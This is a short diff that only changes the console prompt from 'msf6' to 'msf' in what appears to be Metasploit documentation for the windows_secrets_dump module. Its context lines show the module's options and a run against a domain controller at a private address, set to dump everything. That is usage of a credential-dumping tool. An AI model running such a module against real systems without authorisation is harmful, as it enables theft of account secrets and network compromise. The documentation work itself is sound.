@@ -90,7 +90,7 @@ sensitive information.
 
 ### Windows Server 2012 (Domain Controller)
 ```
-msf6 auxiliary(gather/windows_secrets_dump) > options
+msf auxiliary(gather/windows_secrets_dump) > options
 
 Module options (auxiliary/gather/windows_secrets_dump):
 
@@ -110,7 +110,7 @@ Auxiliary action:
    ALL   Dump everything
 
 
-msf6 auxiliary(gather/windows_secrets_dump) > run
+msf auxiliary(gather/windows_secrets_dump) > run
 [*] Running module against 192.168.100.123
 
 [*] 192.168.100.123:445 - Service RemoteRegistry is in stopped state
